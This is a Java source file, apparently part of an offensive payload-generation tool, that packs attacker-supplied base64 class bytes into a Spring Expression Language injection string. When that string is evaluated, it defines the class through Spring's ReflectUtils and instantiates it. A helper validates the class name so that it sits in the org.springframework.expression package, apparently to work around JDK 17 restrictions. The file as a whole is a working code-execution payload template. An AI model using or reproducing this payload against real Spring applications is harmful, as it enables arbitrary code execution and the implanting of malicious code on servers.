package com.reajason.javaweb.packer.spel;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;

/**
 * @author ReaJason
 * @since 2024/12/13
 */
public class SpELSpringIOUtilsGzipJDK17Packer implements Packer {
    String template = "T(org.springframework.cglib.core.ReflectUtils).defineClass('{{className}}',T(org.springframework.util.Base64Utils).decodeFromString('{{base64Str}}'),T(java.lang.Thread).currentThread().getContextClassLoader(),null,T(java.lang.Class).forName('org.springframework.expression.ExpressionParser')).newInstance()";

    @Override
    public String pack(ClassPackerConfig config) {
        String className = config.getClassName();
        assertClassNameValid(className);
        return template.replace("{{className}}", className)
                .replace("{{base64Str}}", config.getClassBytesBase64Str());
    }

    public static void assertClassNameValid(String className) {
        String packageName = className.substring(0, className.lastIndexOf("."));
        if (!"org.springframework.expression".equals(packageName)) {
            throw new UnsupportedOperationException(className + " is not supported, please set className in same package org.springframework.expression, " +
                    "for example, org.springframework.expression.CommonUtil, org.springframework.expression.sub.CommonUtil will also not work");
        }
    }
}